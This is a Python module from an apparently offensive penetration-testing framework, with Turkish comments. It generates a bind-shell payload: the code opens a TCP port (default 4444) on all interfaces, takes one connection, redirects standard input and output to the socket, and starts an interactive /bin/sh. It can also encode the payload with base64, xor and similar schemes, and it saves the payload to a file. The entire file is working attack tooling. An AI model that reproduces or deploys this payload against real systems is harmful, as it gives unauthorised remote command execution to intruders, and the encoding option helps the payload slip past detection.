from core.module import BaseModule
from core.option import Option
from typing import Dict, Any

class Payload(BaseModule):
    """
    Python Shell Bind TCP Payload.
    Hedef sistemde bir port açar ve bağlantı bekler.
    """
    Name = "Python Shell Bind TCP"
    Description = "Python tabanlı Bind TCP Shell."
    Author = "Mahmut P."
    Category = "payloads"

    def __init__(self):
        super().__init__()
        self.Options = {
            "LPORT": Option("LPORT", 4444, True, "Bağlanılacak Port."),
            "ENCODE": Option("ENCODE", "None", False, "Payload'ı encode et (base64, xor, hex, rot13, unicode_escape veya zincir)."),
            "OUTPUT": Option("OUTPUT", "", False, "Payload'ı dosyaya kaydet.", completion_dir=".")
        }

    def generate(self) -> str:
        """Payload kodunu üretir."""
        lport = self.get_option_value("LPORT")

        # Python bind shell implementation
        raw_payload = f"""
import socket,os,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(("0.0.0.0",{lport}))
s.listen(1)
c,a=s.accept()
os.dup2(c.fileno(),0)
os.dup2(c.fileno(),1)
os.dup2(c.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""
        encode_type = self.get_option_value("ENCODE")
        from core.encoders.manager import apply_encoding
        return apply_encoding(raw_payload.strip(), encode_type)

    def run(self, options: Dict[str, Any]):
        """Payload oluştur ve ekrana bas/kaydet."""
        code = self.generate()
        
        output_path = self.get_option_value("OUTPUT")
        if output_path:
            if not output_path.endswith(".py"):
                output_path += ".py"
                
            try:
                with open(output_path, "w") as f:
                    f.write(code)
                print(f"[*] Payload başarıyla kaydedildi: {output_path}")
                return f"Payload saved to {output_path}"
            except Exception as e:
                print(f"[!] Dosya yazma hatası: {e}")
                return code

        print(f"[*] Payload oluşturuldu ({len(code)} bytes):")
        print("-" * 50)
        print(code)
        print("-" * 50)
        return code
